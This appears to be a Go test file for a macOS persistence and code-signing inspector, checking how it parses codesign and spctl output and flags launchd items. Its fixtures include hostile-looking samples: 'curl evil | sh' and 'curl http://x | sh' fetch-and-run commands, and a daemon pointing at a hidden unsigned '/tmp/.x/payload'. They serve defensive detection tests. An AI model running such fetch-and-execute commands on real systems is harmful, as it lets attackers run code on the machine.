package runner

import (
	"context"
	"errors"
	"os"
	"strings"
	"testing"

	"github.com/jimididit/mac-compass/internal/catalog"
)

const appleCodesign = `Executable=/usr/libexec/foo
Identifier=com.apple.foo
Format=Mach-O universal (x86_64 arm64e)
CodeDirectory v=20400 size=1000 flags=0x0(none) hashes=20+2 location=embedded
Platform identifier=15
Signature size=4442
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
TeamIdentifier=not set`

const devIDCodesign = `Executable=/Library/Foo/foo
Identifier=com.foo.agent
CodeDirectory v=20500 size=900 flags=0x10000(runtime) hashes=20+2 location=embedded
Authority=Developer ID Application: Foo Inc (ABCDE12345)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
TeamIdentifier=ABCDE12345`

const adhocCodesign = `Executable=/tmp/x
Identifier=x
CodeDirectory v=20400 size=300 flags=0x20002(adhoc,linker-signed) hashes=5+0 location=embedded
Signature=adhoc
TeamIdentifier=not set`

func TestParseCodesign(t *testing.T) {
	cases := []struct {
		name  string
		out   string
		code  int
		state string
		team  string
	}{
		{"apple platform", appleCodesign, 0, "apple", "-"},
		{"developer id", devIDCodesign, 0, "developer-id", "ABCDE12345"},
		{"adhoc", adhocCodesign, 0, "adhoc", "-"},
		{"unsigned", "/tmp/y: code object is not signed at all", 1, "unsigned", "-"},
		{"other cert", "Identifier=x\nAuthority=Apple Development: me@example.com (XYZ)\nAuthority=Apple Worldwide Developer Relations Certification Authority\nAuthority=Apple Root CA\nTeamIdentifier=XYZ1234567", 0, "other-signed", "XYZ1234567"},
		{"unreadable", "something odd", 2, "unreadable", "-"},
	}
	for _, c := range cases {
		got := parseCodesign(c.out, c.code)
		if got.State != c.state || got.Team != c.team {
			t.Errorf("%s: got %+v; want state=%s team=%s", c.name, got, c.state, c.team)
		}
	}
	if s := parseCodesign(devIDCodesign, 0).Signer; !strings.HasPrefix(s, "Developer ID Application: Foo Inc") {
		t.Errorf("signer = %q", s)
	}
}

func TestParseSpctl(t *testing.T) {
	cases := map[string]string{
		"/x: accepted\nsource=Notarized Developer ID\norigin=Developer ID Application: Foo (ABC)": "notarized",
		"/x: accepted\nsource=Developer ID":        "developer-id",
		"/x: accepted\nsource=Apple System":        "apple",
		"/x: accepted\nsource=Mac App Store":       "app-store",
		"/x: rejected\nsource=no usable signature": "rejected",
		"weird": "unknown",
	}
	for in, want := range cases {
		if got := parseSpctl(in); got != want {
			t.Errorf("parseSpctl(%q) = %s; want %s", in, got, want)
		}
	}
}

func TestRiskyLocation(t *testing.T) {
	cases := map[string]string{
		"/usr/libexec/foo":                      "",
		"/Library/Foo/bin/foo":                  "",
		"/tmp/x":                                "temp-location",
		"/private/var/tmp/x":                    "temp-location",
		"/var/folders/ab/cd/T/x":                "temp-location",
		"/Users/Shared/x":                       "temp-location",
		"/Users/me/.hidden/agent":               "hidden-location",
		"/Library/Application Support/.cache/x": "hidden-location",
		"/Users/me/Library/foo/..":              "",
	}
	for in, want := range cases {
		if got := riskyLocation(in); got != want {
			t.Errorf("riskyLocation(%q) = %q; want %q", in, got, want)
		}
	}
}

func TestScriptArg(t *testing.T) {
	cases := []struct {
		args []string
		want string
	}{
		{[]string{"/bin/sh", "/Library/Foo/run.sh"}, "/Library/Foo/run.sh"},
		{[]string{"/bin/bash", "-x", "/opt/run.sh", "arg"}, "/opt/run.sh"},
		{[]string{"/bin/sh", "-c", "curl evil | sh"}, ""},
		{[]string{"/usr/bin/python3"}, ""},
		{[]string{"/bin/sh", "relative.sh"}, ""},
	}
	for _, c := range cases {
		if got := scriptArg(c.args); got != c.want {
			t.Errorf("scriptArg(%v) = %q; want %q", c.args, got, c.want)
		}
	}
}

// fakeSystem builds deps backed by in-memory plists and signing results.
type fakeSystem struct {
	dirs   map[string][]string  // dir -> file names
	plists map[string]string    // plist path -> JSON
	sign   map[string][2]string // target -> codesign output, spctl output
	exists map[string]bool
	calls  map[string]int
}

func (f *fakeSystem) deps(home string) deps {
	return deps{
		home: home,
		listDir: func(dir string) ([]string, error) {
			if n, ok := f.dirs[dir]; ok {
				return n, nil
			}
			return nil, os.ErrNotExist
		},
		exists: func(p string) bool { return f.exists[p] },
		exec: func(ctx context.Context, argv ...string) (string, string, int, error) {
			switch argv[0] {
			case "/usr/bin/plutil":
				path := argv[len(argv)-1]
				j, ok := f.plists[path]
				if !ok {
					return "", "no such file", 1, nil
				}
				return j, "", 0, nil
			case "/usr/bin/codesign":
				t := argv[len(argv)-1]
				f.calls[t]++
				out := f.sign[t][0]
				if strings.Contains(out, "not signed at all") {
					return "", out, 1, nil
				}
				return "", out, 0, nil
			case "/usr/sbin/spctl":
				t := argv[len(argv)-1]
				return "", f.sign[t][1], 3, nil
			}
			return "", "", 0, errors.New("unexpected command " + argv[0])
		},
	}
}

func TestLaunchdTargets(t *testing.T) {
	f := &fakeSystem{
		calls: map[string]int{},
		dirs: map[string][]string{
			"/Library/LaunchDaemons":         {"com.good.plist", "com.evil.plist", "com.gone.plist", "readme.txt", "com.script.plist"},
			"/Library/LaunchAgents":          {"com.good2.plist"},
			"/Users/me/Library/LaunchAgents": {"com.adhoc.plist"},
		},
		plists: map[string]string{
			"/Library/LaunchDaemons/com.good.plist":          `{"Label":"com.good","ProgramArguments":["/Library/Foo/foo","--daemon"],"RunAtLoad":true,"KeepAlive":true}`,
			"/Library/LaunchDaemons/com.evil.plist":          `{"Label":"com.evil","Program":"/tmp/.x/payload","RunAtLoad":true}`,
			"/Library/LaunchDaemons/com.gone.plist":          `{"Label":"com.gone","ProgramArguments":["/opt/removed/app"]}`,
			"/Library/LaunchDaemons/com.script.plist":        `{"Label":"com.script","ProgramArguments":["/bin/sh","-c","curl http://x | sh"],"KeepAlive":{"SuccessfulExit":false}}`,
			"/Library/LaunchAgents/com.good2.plist":          `{"Label":"com.good2","ProgramArguments":["/Library/Foo/foo"]}`,
			"/Users/me/Library/LaunchAgents/com.adhoc.plist": `{"Label":"com.adhoc","ProgramArguments":["/Users/me/bin/tool"]}`,
		},
		exists: map[string]bool{"/bin/sh": true, "/Library/Foo/foo": true, "/tmp/.x/payload": true, "/Users/me/bin/tool": true},
		sign: map[string][2]string{
			"/Library/Foo/foo":   {devIDCodesign, "/x: accepted\nsource=Notarized Developer ID"},
			"/tmp/.x/payload":    {"/tmp/.x/payload: code object is not signed at all", "/x: rejected\nsource=no usable signature"},
			"/Users/me/bin/tool": {adhocCodesign, "/x: rejected"},
		},
	}
	out, err := launchdTargets(context.Background(), f.deps("/Users/me"))
	if err != nil {
		t.Fatal(err)
	}
	rows := strings.Split(strings.TrimSpace(out), "\n")
	if rows[0] != LaunchdHeader {
		t.Fatalf("header = %q", rows[0])
	}
	byLabel := map[string][]string{}
	for _, r := range rows[1:] {
		c := strings.Split(r, "\t")
		if len(c) != 9 {
			t.Fatalf("row has %d columns: %q", len(c), r)
		}
		byLabel[c[1]] = c
	}
	if len(byLabel) != 6 {
		t.Fatalf("want 6 items (readme.txt ignored), got %d: %v", len(byLabel), byLabel)
	}
	col := func(label string, i int) string { return byLabel[label][i] }
	// columns: kind label plist target state team signer notarization flags
	if col("com.good", 4) != "developer-id" || col("com.good", 5) != "ABCDE12345" || col("com.good", 7) != "notarized" || col("com.good", 8) != "runatload,keepalive" {
		t.Errorf("good item: %v", byLabel["com.good"])
	}
	if col("com.evil", 4) != "unsigned" || !strings.Contains(col("com.evil", 8), "hidden-location") && !strings.Contains(col("com.evil", 8), "temp-location") {
		t.Errorf("evil item: %v", byLabel["com.evil"])
	}
	if col("com.gone", 4) != "missing" {
		t.Errorf("missing item: %v", byLabel["com.gone"])
	}
	if col("com.script", 4) != "script" || !strings.Contains(col("com.script", 8), "inline-command") || !strings.Contains(col("com.script", 8), "keepalive") {
		t.Errorf("script item: %v", byLabel["com.script"])
	}
	if col("com.adhoc", 0) != "user-agent" || col("com.adhoc", 4) != "adhoc" {
		t.Errorf("adhoc item: %v", byLabel["com.adhoc"])
	}
	if f.calls["/Library/Foo/foo"] != 1 {
		t.Errorf("a program shared by two items must be inspected once, got %d", f.calls["/Library/Foo/foo"])
	}
}

func TestLaunchdTargets_UnreadablePlistAndTimeout(t *testing.T) {
	f := &fakeSystem{calls: map[string]int{}, dirs: map[string][]string{"/Library/LaunchDaemons": {"bad.plist"}}}
	out, err := launchdTargets(context.Background(), f.deps(""))
	if err != nil || !strings.Contains(out, "unreadable") {
		t.Errorf("unreadable plist should be a row, not an error: %q %v", out, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := launchdTargets(ctx, f.deps("")); err == nil {
		t.Error("a cancelled context must stop the scan")
	}
}

func TestEveryKnownBuiltinIsImplemented(t *testing.T) {
	for _, name := range catalog.KnownBuiltins {
		if _, ok := builtins[name]; !ok {
			t.Errorf("builtin %q is listed in the catalog but not implemented", name)
		}
	}
	if len(builtins) != len(catalog.KnownBuiltins) {
		t.Errorf("builtins (%d) and catalog.KnownBuiltins (%d) differ", len(builtins), len(catalog.KnownBuiltins))
	}
}
